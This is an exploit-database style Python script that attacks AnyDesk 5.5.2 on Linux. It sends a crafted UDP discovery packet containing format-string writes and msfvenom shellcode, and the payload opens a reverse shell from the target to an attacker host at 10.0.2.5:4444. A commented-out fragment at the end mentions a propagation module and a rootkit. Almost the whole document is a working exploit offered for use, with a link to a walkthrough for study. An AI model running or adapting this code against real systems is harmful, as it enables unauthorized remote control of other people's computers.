# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.0.2.15'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xee\xca\xd4"
shellcode += b"\xb4\xc6\x9c\x61\x2d\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x84\xe3\x8c\x2d\xac"
shellcode += b"\x9e\x3e\x47\xef\x94\xdb\xb1\x8e\x0b\x29\x94"
shellcode += b"\xec\xca\xc5\xe8\xcc\x9c\x63\x28\xbf\x82\x5d"
shellcode += b"\x52\xac\x8c\x3b\x47\xc4\x92\xdb\xb1\xac\x9f"
shellcode += b"\x3f\x65\x11\x04\xbe\x95\x9e\x93\x64\x58\x18"
shellcode += b"\xa0\xef\xec\x5f\xd4\xda\x02\x8c\xa3\xba\x9b"
shellcode += b"\xb5\xf4\x61\x7e\xa6\x43\x33\xe6\x91\xd4\xe8"
shellcode += b"\xcb\xe1\xcf\xd4\xb4\xc6\x9c\x61\x2d"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
            
#def run():
#    next_action = ""
#    data = ""
#    print("[+] Propagation module activated...")
#
#    next_action = "rootkit"
#    return data, next_action
